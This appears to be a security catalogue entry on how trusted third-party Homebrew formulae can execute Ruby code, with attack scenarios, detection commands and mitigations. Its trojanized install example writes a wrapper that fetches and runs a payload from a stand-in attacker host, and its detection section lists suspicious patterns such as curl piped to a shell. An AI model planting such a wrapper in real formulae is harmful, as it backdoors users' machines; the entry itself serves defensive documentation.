---
name: "Trusted Third-Party Homebrew Formula Code Execution"
packageManager: "brew"
slug: "brew-formula-install-ruby"
category: "Code Execution"
severity: "high"
platform:
  - "macOS"
  - "Linux"
description: "Homebrew formulae are Ruby package definitions. Official formula installs normally use signed JSON metadata and reviewed bottles, while non-official taps require explicit trust by default. Loading a trusted third-party formula can execute its Ruby with the user's privileges. Source-build and post-install commands run inside Homebrew's sandbox where supported, which restricts filesystem, network, environment, and credential access. The practical risk is therefore concentrated in formula loading, explicitly trusted third-party code, and any installed program the user later runs."
descriptionCitations: [1, 2, 3, 4, 5]
prerequisites:
  - "Ability to publish or modify a formula in a non-official tap"
  - "Victim installs the formula by its fully qualified name, explicitly trusts that formula, or previously trusted the entire tap"
  - "For a compromise scenario, the affected formula or tap remains trusted when Homebrew later loads the changed Ruby definition"
prerequisitesCitations: [1, 2, 3, 4, 5]
attackScenarios:
  - title: "Trusted Formula Executes Ruby When Loaded"
    description: "An attacker publishes or compromises a formula in a non-official tap. Installing its fully qualified name is an explicit trust decision for that formula. When Homebrew loads the trusted definition, Ruby in the formula body can run with the invoking user's privileges, outside the more limited actions of a normal bottled install."
    citations: [1, 2, 3, 4, 5]
    commands:
      - label: "Illustrative formula with load-time Ruby"
        code: |
          class HelpfulCli < Formula
            desc "A handy developer CLI"
            homepage "https://example.com/helpful-cli"
            url "https://example.com/helpful-cli-1.0.0.tar.gz"
            # Illustrative digest; a real formula must match its source archive.
            sha256 "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
            license "MIT"

            # The class body is evaluated when Homebrew loads this trusted formula.
            File.write("/tmp/helpful-cli-formula-loaded", Time.now.to_s)

            def install
              bin.install "helpful-cli"
            end
          end
        language: "ruby"
      - label: "Victim installs from the compromised tap"
        code: |
          brew install attacker/devtools/helpful-cli
          # The fully qualified install trusts only this formula, then loads it.
        language: "bash"
  - title: "Sandboxed Install Method Places a Trojanized Executable"
    description: "A source-build `install` method can place attacker-controlled files inside the formula's allowed installation paths. Homebrew's sandbox limits unrelated filesystem and credential access where supported, but it cannot make an intentionally malicious executable safe. The payload runs with the user's privileges when the installed command is invoked."
    citations: [1, 2, 3, 4, 5]
    commands:
      - label: "install method placing a wrapper in the formula prefix"
        code: |
          def install
            (bin/"helpful-cli").write <<~SH
              #!/bin/sh
              curl -fsSL https://attacker.example.com/stage2 | /bin/sh
              exec "#{libexec}/helpful-cli.real" "$@"
            SH
            chmod 0755, bin/"helpful-cli"
            libexec.install "helpful-cli" => "helpful-cli.real"
          end
        language: "ruby"
detection:
  - title: "Audit formula Ruby before installing from third-party taps"
    description: "Use `brew cat` to inspect a formula's Ruby source before installing it. Review the class body as well as `install`, `post_install`, and other methods for unexpected network calls, process execution, or file operations."
    citations: [1, 2, 3, 4, 5]
    commands:
      - code: |
          brew cat attacker/devtools/helpful-cli
          # Look for: Net::HTTP, URI.open, system(..), `..`, File.write outside prefix, launchctl, curl|bash
        language: "bash"
  - title: "Inspect the tap's git history for unreviewed install-method changes"
    description: "Third-party taps are git repositories cloned under `$(brew --repository)/Library/Taps`. Diff the local clone against upstream to spot install-time changes inserted between user pulls."
    citations: [1, 2, 3, 4, 5]
    commands:
      - code: |
          cd "$(brew --repository)/Library/Taps/attacker/homebrew-devtools"
          git log --all --oneline -- Formula/helpful-cli.rb
          git diff HEAD~5 -- Formula/helpful-cli.rb
        language: "bash"
  - title: "Monitor Homebrew for unexpected network and filesystem activity"
    description: "Use operating-system telemetry to flag unexpected connections or writes by Homebrew. Interpret findings with Homebrew's sandbox and configuration in mind: supported build and post-install steps are restricted where sandboxing is available, while trusted formula Ruby may also run when Homebrew loads the definition."
    citations: [1, 2, 3, 4, 5]
    commands:
      - code: |
          sudo fs_usage -w -f filesys brew 2>&1 | grep -vE "Cellar|Caskroom|Library/Homebrew|Library/Taps"
        language: "bash"
mitigation:
  - "Prefer formulae from homebrew/core and homebrew/cask, which require public PR review before merge"
  - "Prefer `brew trust --formula user/repository/formula` over whole-tap trust, and review the formula before granting trust"
  - "Pin the tap to a reviewed commit when reproducibility matters (`git -C $(brew --repository)/Library/Taps/... checkout <sha>`)"
  - "Run Homebrew as its intended non-root owning user and keep production secrets out of developer environments"
  - "Use `HOMEBREW_NO_AUTO_UPDATE=1` in CI to prevent pulling unreviewed tap updates mid-build"
  - "Monitor `~/Library/LaunchAgents` and `/Library/LaunchDaemons` for plists created by brew processes"
mitigationCitations: [1, 2, 3, 4, 5]
references:
  - title: "Homebrew Formula Cookbook"
    url: "https://docs.brew.sh/Formula-Cookbook"
  - title: "Homebrew Acceptable Formulae"
    url: "https://docs.brew.sh/Acceptable-Formulae"
  - title: "Formula API Reference"
    url: "https://rubydoc.brew.sh/Formula"
  - title: "Homebrew Security and Supply Chain"
    url: "https://docs.brew.sh/Homebrew-Security-and-Supply-Chain"
  - title: "Homebrew Tap Trust"
    url: "https://docs.brew.sh/Tap-Trust"
created: 2026-04-21
updated: 2026-10-14
---
